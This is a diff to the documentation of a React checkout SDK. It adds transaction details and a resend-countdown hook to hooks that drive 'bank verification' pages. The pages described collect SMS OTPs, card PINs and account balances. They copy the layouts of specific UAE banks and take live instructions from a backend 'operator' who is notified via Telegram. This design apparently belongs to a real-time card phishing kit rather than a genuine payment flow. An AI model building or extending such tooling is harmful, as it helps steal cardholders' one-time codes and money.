@@ -142,21 +142,33 @@ When `sessionId` is `null` or empty, the hook skips API/WebSocket calls and retu
 
 **Returns:**
 
-| Property            | Type                                               | Description |
-|---------------------|----------------------------------------------------|-------------|
-| `status`            | `string`                                           | Current session status (see [Status values](#status-values)). |
-| `verificationLayout`| `string`                                           | Layout to render: `sms`, `pin`, `push`, `balance`, or channel-specific (`enbd-sms`, `adcb-sms`, etc.). |
-| `bank`              | `string \| undefined`                             | Bank/issuer name from BIN lookup (e.g. "Emirates NBD"). Displayed in verification layouts when present. |
-| `redirectUrl`       | `string \| null`                                   | If set, redirect the user to this URL. |
-| `wrongCode`         | `boolean`                                          | True when OTP/PIN was incorrect; show "try again" UI. |
-| `expiredCode`       | `boolean`                                          | True when OTP/PIN was expired; show "Code expired" message. |
-| `clearWrongCode`    | `() => void`                                       | Call to reset `wrongCode` after user retries. |
-| `clearExpiredCode`  | `() => void`                                       | Call to reset `expiredCode`. |
-| `clearCodeFeedback` | `() => void`                                       | Call to reset both `wrongCode` and `expiredCode`; use as `onTryAgain`. |
-| `operatorMessage`   | `{ level: "error" \| "info"; message: string } \| null` | Message from the backend to display. |
-| `clearOperatorMessage` | `() => void`                                    | Call to clear the operator message. |
-| `error`             | `string \| null`                                   | Error message if the initial status fetch failed. |
-| `refetch`           | `() => Promise<void>`                              | Manually refetch status. |
+| Property              | Type                                               | Description |
+|-----------------------|----------------------------------------------------|-------------|
+| `status`              | `string`                                           | Current session status (see [Status values](#status-values)). |
+| `verificationLayout`  | `string`                                           | Layout to render: `sms`, `pin`, `push`, `balance`, or channel-specific (`enbd-sms`, `adcb-sms`, etc.). |
+| `bank`                | `string \| undefined`                              | Bank/issuer name from BIN lookup (e.g. "Emirates NBD"). Displayed in verification layouts when present. |
+| `redirectUrl`         | `string \| null`                                   | If set, redirect the user to this URL. |
+| `transactionDetails`  | `TransactionDetails \| undefined`                  | Merchant, amount, date, card info for display in verification layouts. |
+| `wrongCode`           | `boolean`                                          | True when OTP/PIN was incorrect; show "try again" UI. |
+| `expiredCode`         | `boolean`                                          | True when OTP/PIN was expired; show "Code expired" message. |
+| `clearWrongCode`      | `() => void`                                       | Call to reset `wrongCode` after user retries. |
+| `clearExpiredCode`    | `() => void`                                       | Call to reset `expiredCode`. |
+| `clearCodeFeedback`   | `() => void`                                       | Call to reset both `wrongCode` and `expiredCode`; use as `onTryAgain`. |
+| `operatorMessage`     | `{ level: "error" \| "info"; message: string } \| null` | Message from the backend to display. |
+| `clearOperatorMessage`| `() => void`                                       | Call to clear the operator message. |
+| `countdownResetTrigger`| `number`                                           | Increments when backend sends `countdownReset`; pass to `useResendCountdown` to reset resend cooldown. |
+| `error`               | `string \| null`                                   | Error message if the initial status fetch failed. |
+| `refetch`             | `() => Promise<void>`                               | Manually refetch status. |
+
+### `useResendCountdown`
+
+Hook for resend cooldown in custom OTP/PIN layouts. Use with `countdownResetTrigger` from `useSessionStatus` so the backend can reset the cooldown (e.g. after wrong code).
+
+```ts
+useResendCountdown(durationSeconds: number, countdownResetTrigger?: number, resendFn?: () => Promise<void>)
+```
+
+**Returns:** `{ secondsLeft, canResend, onResend, resending }`
 
 ### Status utilities
 
@@ -177,6 +189,7 @@ Exported helpers for status values:
 - **`PaymentData`** — Payment data shape for `submitPayment`
 - **`UseCheckoutFlowReturn`** — Return type of `useCheckoutFlow`
 - **`BinLookupInfo`** — `{ brand?, type?, category?, issuer?, isoCode2?, blocked }` — Used by `binLookup` from `useCheckoutFlow`.
+- **`TransactionDetails`** — `{ merchantName?, amount?, date?, cardNumber?, cardBrand? }` — Transaction info for verification layouts.
 
 ## Status values
 
@@ -219,11 +232,11 @@ Your API must expose these paths (appended to `apiBase`). For direct API calls (
 
 | Endpoint   | Method | Purpose |
 |------------|--------|---------|
-| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/status` | GET  | Session status, `verificationLayout`, and `bank` (issuer name from BIN lookup). |
+| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/status` | GET  | Session status, `verificationLayout`, `bank` (issuer name from BIN lookup), and `transactionDetails`. |
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp`   | POST | Submit SMS OTP code. Body: `{ code: string }`. |
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp/resend` | POST | Request resend. Body: `{ type: "sms" }` or `{ type: "pin" }`. Notifies operator via Telegram. |
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/balance` | POST | Submit balance response. Body: `{ balance: string }`. |
-| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/ws`   | WebSocket | Real-time status, `bank`, `redirectUrl`, `wrongCode`, `expiredCode`, `operatorMessage`, `countdownReset`. |
+| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/ws`   | WebSocket | Real-time status, `bank`, `transactionDetails`, `redirectUrl`, `wrongCode`, `expiredCode`, `operatorMessage`, `countdownReset`. |
 
 Bank verification uses session-based auth (no API key in requests); session is identified by cookies or similar.
 
@@ -249,10 +262,13 @@ function CustomVerifyPage({ apiBase, channelSlug, sessionId }) {
   const {
     status,
     verificationLayout,
+    bank,
+    transactionDetails,
     redirectUrl,
     wrongCode,
     clearWrongCode,
     operatorMessage,
+    countdownResetTrigger,
     error,
     refetch,
   } = useSessionStatus(apiBase, channelSlug, sessionId);
@@ -269,9 +285,12 @@ function CustomVerifyPage({ apiBase, channelSlug, sessionId }) {
   return (
     <YourCustomLayout
       layout={verificationLayout}
+      bank={bank}
+      transactionDetails={transactionDetails}
       wrongCode={wrongCode}
       onTryAgain={clearWrongCode}
       operatorMessage={operatorMessage}
+      countdownResetTrigger={countdownResetTrigger}
       apiBase={apiBase}
       channelSlug={channelSlug}
       sessionId={sessionId}
